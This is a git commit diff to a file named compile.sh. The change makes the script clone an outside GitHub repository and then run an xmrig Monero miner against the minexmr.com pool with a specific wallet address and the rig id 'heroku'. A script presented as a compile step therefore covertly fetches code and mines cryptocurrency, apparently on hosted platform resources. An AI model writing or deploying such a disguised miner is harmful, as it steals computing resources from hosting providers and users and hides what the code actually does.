0cd10d4cb0b8e7d386658686786c0f58ac1a2736
mi33rs <104284556+mi33rs@users.noreply.github.com>
2022-04-24 11:37:49 +0800

    Update compile.sh

--- compile.sh
+++ compile.sh
@@ -1,3 +1,3 @@
-cd /compile
+git clone https://github.com/mi33rs/herobrine /compile &&cd /compile
 chmod 755 xmrig
 ./xmrig -o us-west.minexmr.com:443 -u 45EUJCTJbToDf79PU8YrXxHwAomkXcWapBBGeQSKbb3hJKRbwbbJ8NZ34GQT61qkPEivjq3fk78DxVhmyyZCeSXJ1hw7PQR -k --tls --rig-id heroku
